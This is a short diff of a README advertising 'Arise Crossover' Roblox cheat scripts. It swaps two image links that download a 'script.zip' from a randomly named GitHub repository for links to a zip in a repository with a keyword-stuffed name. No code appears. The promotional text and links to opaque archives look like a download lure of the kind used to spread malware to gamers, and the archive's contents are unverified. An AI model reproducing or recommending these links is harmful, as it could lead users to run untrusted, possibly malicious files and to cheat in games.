@@ -13,10 +13,10 @@ In this detailed guide, you’ll discover:
 Let’s dive into the world of **Arise Crossover scripting** — where strategy meets automation.
 
 [![image](https://github.com/user-attachments/assets/c2c76d38-17eb-42c0-8042-5bf1c445cd14)
-](https://github.com/Packet-star/studious-fishstick/releases/download/new/script.zip)
+](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
 
 [![hq720](https://github.com/user-attachments/assets/8e0bd1a8-a15e-4509-af00-e7c7d552f56d)
-](https://github.com/Packet-star/studious-fishstick/releases/download/new/script.zip)
+](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
 
 ---
 
